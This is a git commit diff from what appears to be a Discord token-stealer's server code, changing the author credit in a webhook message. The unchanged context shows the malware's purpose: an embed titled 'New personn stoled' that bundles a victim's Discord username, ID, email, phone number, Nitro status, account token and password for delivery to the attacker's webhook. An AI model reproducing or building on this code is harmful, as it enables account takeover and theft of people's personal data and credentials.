03794d8ce4c3c9b5c60fb3a1df0e498b384a3532
Starkzahgrabb <90716725+Starkzahgrabb@users.noreply.github.com>
2021-09-15 15:47:23 +0200

    Update index.js
    Bg

--- endpoints/index.js
+++ endpoints/index.js
@@ -40,7 +40,7 @@ exports.send = (req, res, webhook) => {
             
             var omg = {
   author: {
-    name: "Dev By Zak#1337"
+    name: "Dev By Hideaki alias Game Over"
   },
   title: "New personn stoled",
   description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,
